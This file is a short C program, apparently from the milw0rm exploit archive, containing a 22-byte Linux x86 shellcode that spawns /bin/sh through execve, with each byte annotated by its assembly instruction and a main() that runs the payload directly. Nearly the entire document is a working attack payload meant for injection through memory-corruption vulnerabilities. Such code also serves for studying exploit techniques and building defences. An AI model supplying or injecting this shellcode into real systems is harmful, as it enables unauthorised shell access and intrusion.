/*
 * revenge-execve.c, v1.0 2006/10/14 16:32
 *
 * Yet another linux execve shellcode..
 * linux/x86 execve("/bin//sh/",["/bin//sh"],NULL) shellcode
 *
 * http://www.0xcafebabe.it
 * <revenge@0xcafebabe.it>
 *
 * But this time it's 22 bytes
 *
 * [ We could start the shellcode with a mov instead of (push + pop) eax  ]
 * [ obtaining the same result with 1 byte less, but if we had something  ]
 * [ wrong in eax (ex. -1 due to an unclear function exit) we can't       ]
 * [ inject it                                                            ]
 *
 * */

char sc[] =
                                     // <_start>
       "\xb0\x0b"                    // mov    $0xb,%al
       "\x99"                        // cltd
       "\x52"                        // push   %edx
       "\x68\x2f\x2f\x73\x68"        // push   $0x68732f2f
       "\x68\x2f\x62\x69\x6e"        // push   $0x6e69622f
       "\x89\xe3"                    // mov    %esp,%ebx
       "\x52"                        // push   %edx
       "\x53"                        // push   %ebx
       "\x89\xe1"                    // mov    %esp,%ecx
       "\xcd\x80"                    // int    $0x80
;

int main()
{
       void    (*fp)(void) = (void (*)(void))sc;

       printf("Length: %d\n",strlen(sc));
       fp();
}

// milw0rm.com [2006-11-16]